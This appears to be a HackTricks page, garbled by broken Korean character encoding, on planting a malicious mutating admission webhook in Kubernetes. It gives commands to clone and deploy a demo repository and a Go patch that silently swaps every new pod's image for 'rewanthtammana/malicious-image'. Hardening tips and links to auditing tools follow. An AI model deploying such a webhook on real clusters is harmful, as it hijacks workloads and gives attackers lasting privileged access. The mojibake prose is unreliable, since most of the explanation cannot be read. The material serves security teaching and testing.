Admission ControllerëŠ” Kubernetes API ì„œë²„ë¡œì˜ ìš”ì²­ì„ ê°€ë¡œì±„ëŠ”ë°, ì´ëŠ” ìš”ì²­ì´ ì¸ì¦ ë° ê¶Œí•œ ë¶€ì—¬ëœ í›„ì— ë°œìƒí•©ë‹ˆë‹¤.

ë§Œì•½ ê³µê²©ìê°€ Mutationg Admission Controllerë¥¼ ì‚½ì…í•˜ëŠ”ë° ì„±ê³µí•œë‹¤ë©´, ì´ë¯¸ ì¸ì¦ëœ ìš”ì²­ì„ ìˆ˜ì •í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤. ì´ëŠ” ì ì¬ì ìœ¼ë¡œ ê¶Œí•œ ìƒìŠ¹(privesc)ì„ í•  ìˆ˜ ìˆê²Œ í•˜ë©°, ë” ìì£¼ í´ëŸ¬ìŠ¤í„°ì— ì§€ì†ì ìœ¼ë¡œ ë‚¨ì„ ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

**ì˜ˆì‹œ: [https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)**:
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
ìƒíƒœë¥¼ í™•ì¸í•˜ì—¬ ì¤€ë¹„ë˜ì—ˆëŠ”ì§€ í™•ì¸í•˜ì‹­ì‹œì˜¤:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

ê·¸ëŸ° ë‹¤ìŒ ìƒˆë¡œìš´ íŒŒë“œë¥¼ ë°°í¬í•˜ì„¸ìš”:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
`ErrImagePull` ì˜¤ë¥˜ê°€ ë°œìƒí•  ë•ŒëŠ” ë‹¤ìŒ ì¿¼ë¦¬ ì¤‘ í•˜ë‚˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ë¯¸ì§€ ì´ë¦„ì„ í™•ì¸í•˜ì„¸ìš”:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

ìœ„ì˜ ì´ë¯¸ì§€ì—ì„œ ë³¼ ìˆ˜ ìˆë“¯ì´, ìš°ë¦¬ëŠ” `nginx` ì´ë¯¸ì§€ë¥¼ ì‹¤í–‰í•˜ë ¤ê³  ì‹œë„í–ˆì§€ë§Œ ìµœì¢… ì‹¤í–‰ëœ ì´ë¯¸ì§€ëŠ” `rewanthtammana/malicious-image`ì…ë‹ˆë‹¤. ì–´ë–»ê²Œ ëœ ì¼ì¸ê°€ìš”!?

#### ê¸°ìˆ ì ì¸ ë‚´ìš© <a href="#heading-technicalities" id="heading-technicalities"></a>

`./deploy.sh` ìŠ¤í¬ë¦½íŠ¸ëŠ” ë³€í˜• ì›¹í›… ì–´ë“œë¯¸ì…˜ ì»¨íŠ¸ë¡¤ëŸ¬ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤. ì´ ì»¨íŠ¸ë¡¤ëŸ¬ëŠ” êµ¬ì„± ë¼ì¸ì— ì§€ì •ëœëŒ€ë¡œ Kubernetes APIì— ëŒ€í•œ ìš”ì²­ì„ ìˆ˜ì •í•˜ì—¬ ê´€ì°°ëœ ê²°ê³¼ì— ì˜í–¥ì„ ì¤ë‹ˆë‹¤:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
ìœ„ì˜ ì½”ë“œ ì¡°ê°ì€ ëª¨ë“  íŒŒë“œì˜ ì²« ë²ˆì§¸ ì»¨í…Œì´ë„ˆ ì´ë¯¸ì§€ë¥¼ `rewanthtammana/malicious-image`ë¡œ ëŒ€ì²´í•©ë‹ˆë‹¤.

## ëª¨ë²” ì‚¬ë¡€

### **ì„œë¹„ìŠ¤ ê³„ì • í† í°ì˜ ìë™ ë§ˆìš´íŠ¸ ë¹„í™œì„±í™”**

- **íŒŒë“œ ë° ì„œë¹„ìŠ¤ ê³„ì •**: ê¸°ë³¸ì ìœ¼ë¡œ íŒŒë“œëŠ” ì„œë¹„ìŠ¤ ê³„ì • í† í°ì„ ë§ˆìš´íŠ¸í•©ë‹ˆë‹¤. KubernetesëŠ” ì´ ìë™ ë§ˆìš´íŠ¸ ê¸°ëŠ¥ì„ ë¹„í™œì„±í™”í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•©ë‹ˆë‹¤.
- **ì ìš© ë°©ë²•**: Kubernetes ë²„ì „ 1.6ë¶€í„° ì„œë¹„ìŠ¤ ê³„ì • ë˜ëŠ” íŒŒë“œì˜ êµ¬ì„±ì—ì„œ `automountServiceAccountToken: false`ë¡œ ì„¤ì •í•©ë‹ˆë‹¤.

### **RoleBindings/ClusterRoleBindingsì—ì„œ ì œí•œì ì¸ ì‚¬ìš©ì í• ë‹¹**

- **ì„ íƒì  í¬í•¨**: RoleBindings ë˜ëŠ” ClusterRoleBindingsì— í•„ìš”í•œ ì‚¬ìš©ìë§Œ í¬í•¨ë˜ë„ë¡ í•©ë‹ˆë‹¤. ë³´ì•ˆì„ ê°•í™”í•˜ê¸° ìœ„í•´ ê´€ë ¨ ì—†ëŠ” ì‚¬ìš©ìë¥¼ ì •ê¸°ì ìœ¼ë¡œ ê°ì‚¬í•˜ê³  ì œê±°í•©ë‹ˆë‹¤.

### **ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë³„ ì—­í•  ëŒ€ í´ëŸ¬ìŠ¤í„° ì „ì²´ ì—­í• **

- **Roles vs. ClusterRoles**: í´ëŸ¬ìŠ¤í„° ì „ì²´ì— ì ìš©ë˜ëŠ” ClusterRoles ë° ClusterRoleBindingsë³´ë‹¤ëŠ” ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë³„ ê¶Œí•œì— Roles ë° RoleBindingsì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤. ì´ ì ‘ê·¼ ë°©ì‹ì€ ë” ì„¸ë°€í•œ ì œì–´ì™€ ê¶Œí•œì˜ ë²”ìœ„ ì œí•œì„ ì œê³µí•©ë‹ˆë‹¤.

### **ìë™í™”ëœ ë„êµ¬ ì‚¬ìš©**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **ì°¸ê³  ìë£Œ**

* **[https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)**
* **[https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)**
* **[https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)**


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ì„** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— **PRì„ ì œì¶œ**í•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ìˆ ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
